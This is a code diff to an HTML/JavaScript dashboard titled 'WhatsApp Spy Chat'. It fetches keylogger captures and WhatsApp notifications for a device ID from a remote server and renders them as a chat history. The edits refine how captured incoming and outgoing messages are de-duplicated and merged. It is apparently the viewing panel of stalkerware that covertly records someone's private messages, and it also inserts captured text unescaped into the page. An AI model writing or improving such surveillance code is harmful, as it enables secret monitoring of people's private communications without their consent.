@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Spy Chat (Single Msg Only)</title>
+    <title>WhatsApp Spy Chat (Fixed Logic)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
@@ -32,7 +32,11 @@
         
         /* Bubbles */
         .msg { max-width: 65%; padding: 6px 10px; border-radius: 8px; font-size: 14.2px; position: relative; word-wrap: break-word; line-height: 1.4; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
+        
+        /* INCOMING (LEFT) */
         .msg.incoming { background: #202c33; align-self: flex-start; border-top-left-radius: 0; }
+        
+        /* OUTGOING (RIGHT) */
         .msg.outgoing { background: #005c4b; align-self: flex-end; border-top-right-radius: 0; }
 
         .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; }
@@ -51,7 +55,7 @@
 
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <span>Chats <span style="font-size:10px; color:#00a884;">(Live)</span></span>
+            <span>Chats <span style="font-size:10px; color:#00a884;">(Fixed)</span></span>
             <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear & Reset"></i>
         </div>
         <div class="contact-list" id="contactList">
@@ -74,7 +78,7 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        const STORAGE_KEY = `whatsapp_spy_final_v4_${deviceId}`; // Changed key to reset bad data
+        const STORAGE_KEY = `whatsapp_spy_fixed_v5_${deviceId}`; // New key for fresh start
 
         const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
         const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
@@ -94,13 +98,13 @@
             }
         }
 
-        // 2. Remove Bad Data
+        // 2. Remove Bad Data (FIXED: Checks Type too)
         function sanitizeData() {
             Object.keys(allChats).forEach(user => {
                 allChats[user] = allChats[user].filter(m => m.time && !isNaN(new Date(m.time).getTime()));
                 
-                // Extra check to remove old "group/stacked" messages from storage
-                allChats[user] = allChats[user].filter(m => !m.text.includes("new messages"));
+                // Remove generic junk
+                allChats[user] = allChats[user].filter(m => !m.text.toLowerCase().includes("new messages"));
 
                 const uniqueMsgs = [];
                 allChats[user].forEach(m => {
@@ -108,7 +112,8 @@
                         uniqueMsgs.push(m);
                     } else {
                         const last = uniqueMsgs[uniqueMsgs.length - 1];
-                        if (m.text === last.text && Math.abs(m.time - last.time) < 2000) return; 
+                        // FIXED: Agar text same hai PAR type alag hai (incoming vs outgoing), to delete MAT karo
+                        if (m.text === last.text && Math.abs(m.time - last.time) < 2000 && m.type === last.type) return; 
                         uniqueMsgs.push(m);
                     }
                 });
@@ -128,17 +133,18 @@
 
                 let hasNewData = false;
 
-                // Process Keylogs (Outgoing)
+                // Process Keylogs (Always Outgoing)
                 logs.forEach(item => {
                     if (isValidLog(item)) {
                         if(processMessage(item.title || "Unknown", item.text, item.timestamp, 'outgoing')) hasNewData = true;
                     }
                 });
 
-                // Process Notifications (Incoming)
+                // Process Notifications (Always Incoming/Screen)
                 notifs.sort((a,b) => a.postTime - b.postTime);
                 notifs.forEach(item => {
                     if(item.packageName && item.packageName.includes('whatsapp')) {
+                        // Android app filters Left/Right, so we trust this is Incoming
                         if(processMessage(item.title, item.text, item.postTime, 'incoming')) hasNewData = true;
                     }
                 });
@@ -153,13 +159,13 @@
 
         function isValidLog(item) {
             if(!item.text) return false;
+            // Keylogs are outgoing
             if(item.type === 'outgoing_keylog') return true;
             if(item.appName === 'WhatsApp' && !item.packageName) return true;
-            if(item.type === 'incoming_screen') return true;
             return false;
         }
 
-        // 4. MAIN LOGIC (Group Message Blocker)
+        // 4. MAIN LOGIC (FIXED)
         function processMessage(user, text, time, type) {
             if (!user || !text || text.trim() === "") return false;
             
@@ -168,7 +174,7 @@
 
             if (user.includes("WhatsApp")) return false; 
 
-            // BLOCK SUMMARY MESSAGES (Like "3 new messages")
+            // BLOCK SUMMARY MESSAGES
             if (text.toLowerCase().includes("new messages")) return false;
             if (text.toLowerCase().includes("incoming voice call")) return false;
 
@@ -179,26 +185,24 @@
 
             // --- STRICT "SINGLE MESSAGE" LOGIC ---
             
-            // 1. Exact Duplicate Check
-            const alreadyExists = history.some(m => m.text === text && Math.abs(m.time - ts) < 5000);
+            // 1. Exact Duplicate Check (FIXED: Checks Type also)
+            // Agar msg same hai aur time paas hai, lekin TYPE alag hai -> to wo VALID hai.
+            const alreadyExists = history.some(m => m.text === text && Math.abs(m.time - ts) < 5000 && m.type === type);
             if (alreadyExists) return false;
 
-            // 2. INCOMING GROUP/STACK BLOCKER (New Logic)
-            if (type === 'incoming' && lastMsg) {
-                // Agar naye message ke andar PURANA message chupa hai (matlab ye group notification hai)
-                // TO ISKO IGNORE KARO. (Kyuki single message pehle hi aa chuka hai)
+            // 2. INCOMING GROUP/STACK BLOCKER
+            if (type === 'incoming' && lastMsg && lastMsg.type === 'incoming') {
+                // Sirf Incoming ke baad Incoming check karo
                 if (text.includes(lastMsg.text) && text.length > lastMsg.text.length) {
-                    return false; // Stop the group message
+                    return false; // Stop the group message stack
                 }
-                
-                // Check for "..." which usually means summary
                 if (text.includes("...") && text.includes(lastMsg.text.substring(0, 5))) {
                     return false;
                 }
             }
 
-            // 3. OUTGOING TYPING CORRECTION
-            if (type === 'outgoing' && lastMsg) {
+            // 3. OUTGOING TYPING CORRECTION (Only merge if both are outgoing)
+            if (type === 'outgoing' && lastMsg && lastMsg.type === 'outgoing') {
                 const timeDiff = Math.abs(ts - lastMsg.time);
                 if (text.startsWith(lastMsg.text) && timeDiff < 10000) {
                     history.pop(); 
@@ -286,7 +290,8 @@
 
                 const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
                 const div = document.createElement('div');
-                div.className = `msg ${m.type}`;
+                // Ensure class is strictly applied from data
+                div.className = `msg ${m.type}`; 
                 div.innerHTML = `
                     ${m.text}
                     <div class="msg-meta">
